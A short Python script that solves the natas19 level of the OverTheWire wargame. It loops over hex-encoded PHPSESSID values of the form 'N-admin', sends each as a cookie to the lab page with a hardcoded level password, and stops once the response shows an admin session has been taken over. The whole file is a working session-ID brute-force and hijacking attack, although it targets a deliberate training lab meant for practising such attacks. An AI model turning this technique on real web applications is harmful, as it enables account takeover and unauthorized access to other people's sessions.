#! /usr/bin/env python3
import requests
import binascii

baseUrl = 'http://natas19.natas.labs.overthewire.org/index.php'
for i in range(0, 640):
    PHPSESSID = str(i)+'-admin'
    print('Sending '+PHPSESSID+' => ', end='')
    PHPSESSID = binascii.hexlify(str.encode(PHPSESSID)).decode()
    print(PHPSESSID)
    r = requests.get(baseUrl, auth=('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'), cookies={'PHPSESSID':PHPSESSID})
    if 'You are logged in as a regular user' not in r.text:
        print(r.text)
        break
